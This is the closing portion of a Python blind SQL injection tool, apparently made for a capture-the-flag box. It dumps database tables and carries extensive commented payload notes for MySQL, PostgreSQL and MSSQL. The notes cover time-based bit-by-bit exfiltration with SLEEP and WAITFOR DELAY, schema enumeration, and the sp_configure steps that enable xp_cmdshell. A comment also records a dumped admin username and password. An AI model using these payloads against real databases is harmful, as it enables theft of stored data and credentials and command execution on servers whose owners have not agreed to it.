
	for table in tables:
		#prepare table entry in results ({"columns":list_of_col,"entries":list_of_list_of_entries})
		next_table = dict()
		next_table[table] = dump_table(database,table)
		results[database].append(next_table)


#Prettify the results
#results = {'cengbox': [{"admin": {'columns': ['id', 'username', 'password'], 'entries': [['1', 'masteradmin', 'C3ng0v3R00T1!']]}}]}
prettify_results(results)


#Mysql Notes
#find_character Methodology

	# #Return the binary representation of the second letter of the user in units of SLEEP(*)
	# #Split into 4 parts (requests), 2 bits at a time

	# #MSB (6,7)
	# SELECT CONCAT(
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&128=0,SLEEP(0),SLEEP(2)),
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&64=0,SLEEP(0),SLEEP(1))
	# )

	# #(4,5)
	# SELECT CONCAT(
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&32=0,SLEEP(0),SLEEP(2)),
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&16=0,SLEEP(0),SLEEP(1))
	# )

	# #(2,3)
	# SELECT CONCAT(
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&8=0,SLEEP(0),SLEEP(2)),
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&4=0,SLEEP(0),SLEEP(1))
	# )

	# #LSB (0,1)
	# SELECT CONCAT(
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&2=0,SLEEP(0),SLEEP(2)),
	# 	IF(ORD(SUBSTR(BINARY(SELECT user()),1,1))&1=0,SLEEP(0),SLEEP(1))
	# );

#Count databases
#SELECT COUNT(*) FROM information_schema.SCHEMATA;

#Return First Database
#SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 0,1;
#SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 0;

#Return Third Database
#SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 2,1;
#SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1 OFFSET 2;

#List all tables
#SELECT table_name FROM information_schema.tables ;
#List all table names that aren't system tables
#SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' AND table_schema != 'performance_schema' AND table_schema != 'sys';
#List tables in a database
#SELECT table_name FROM information_schema.tables WHERE table_schema = 'cengbox';
#Count tables in a database
#SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = 'cengbox';

#List columns for table
#SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 'admin';
#Count columns in table
#SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = 'admin';

#Return first character of query
#SELECT SUBSTR(CAST((SELECT user()) AS char),1,1);
#Return second character of query
#SELECT SUBSTR(CAST((SELECT user()) AS char),2,1);

#Return int of first character of query
#Note: int ranges from 33 to 124
#SELECT ASCII(SUBSTR(CAST((SELECT user()) AS char),1,1));

fuckitimout()



# PGSQL Notes
# #\c amdb #connect to test database
# SELECT datname FROM pg_database;

# list tables
# SELECT table_name FROM information_schema.tables WHERE table_schema != 'pg_catalog' AND table_schema != 'information_schema';
# SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema != 'pg_catalog' AND table_schema != 'information_schema';

# list columns 
# SELECT column_name FROM information_schema.columns WHERE table_name = 'admin';
# SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name = 'admin';


# SELECT colname FROM tablename LIMIT 1 OFFSET 3; 
# SELECT substr(colname,1,3) FROM tablename LIMIT 1 OFFSET 3; 
# SELECT CASE WHEN (SELECT ascii(substr(config_name,3,1)) FROM admin_config LIMIT 1 OFFSET 2)=46 THEN 'a' ELSE 'b' END;

# SELECT CASE WHEN (SELECT substr(ascii(substr(config_name,3,1))::bit(8)::text,1,1) FROM admin_config LIMIT 1 OFFSET 2)='1' THEN '1' ELSE '0' END;
# #Enumeate Bits 1 to 2
# SELECT CASE WHEN (SELECT substr(ascii(substr(config_name,3,1))::bit(8)::text,1,1)||substr(ascii(substr(config_name,4,1))::bit(8)::text,2,1) FROM admin_config LIMIT 1 OFFSET 2)='10' THEN '10' ELSE '00' END;


# MSSQL Notes
# List Databases
# SELECT name FROM master..sysdatabases WHERE name != 'model' AND name != 'msdb' AND name != 'tempdb' AND name != 'master';

# List Tables
# SELECT name FROM pwndepot..sysobjects WHERE xtype = 'U';

# List Columns
# SELECT pwndepot..syscolumns.name FROM pwndepot..syscolumns,pwndepot..sysobjects WHERE pwndepot..syscolumns.id=pwndepot..sysobjects.id AND pwndepot..sysobjects.name='tools';

# List nth entry
# SELECT TOP 1 name FROM (SELECT TOP 19 name FROM pwndepot..tools ORDER BY name) sub ORDER BY name DESC;

# 3rd character
# SELECT TOP 1 substring(name,3,1) FROM (SELECT TOP 19 name FROM pwndepot..tools ORDER BY name) sub ORDER BY name DESC;

# bitwise
# SELECT (SELECT ASCII('U')&2)+(SELECT ASCII('U')&1);
# #SELECT CASE WHEN (SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=3 THEN 3 WHEN (SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=2 THEN 2 WHEN (SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=1 THEN (SELECT WAITFOR DELAY '00:00:01') ELSE 0 END
# masks = [(128,64),(32,16),(8,4),(2,1)]
# for i in masks:
# 	largemask,smallmask = i
# 	IF((SELECT ASCII('U')&{largemask})+(SELECT ASCII('U')&{smallmask})={smallmask+largemask}) BEGIN WAITFOR DELAY '0:0:3' END ELSE IF((SELECT ASCII('U')&{largemask})+(SELECT ASCII('U')&{smallmask})={largemask}) BEGIN WAITFOR DELAY '0:0:2' END ELSE IF((SELECT ASCII('U')&{largemask})+(SELECT ASCII('U')&{smallmask})={largemask}) BEGIN WAITFOR DELAY '0:0:1' END ELSE BEGIN WAITFOR DELAY '0:0:0' END  

# IF((SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=3) BEGIN WAITFOR DELAY '0:0:3' END ELSE IF((SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=2) BEGIN WAITFOR DELAY '0:0:2' END ELSE IF((SELECT ASCII('U')&2)+(SELECT ASCII('U')&1)=2) BEGIN WAITFOR DELAY '0:0:1' END ELSE BEGIN WAITFOR DELAY '0:0:0' END  


# xp_cmdshell
# sp_configure 'show advanced options','1'
# RECONFIGURE
# sp_configure 'xp_cmdshell','1'
# RECONFIGURE
total_time = time.time() - start_time
print(f"[*] Program Ended ({total_time}s)")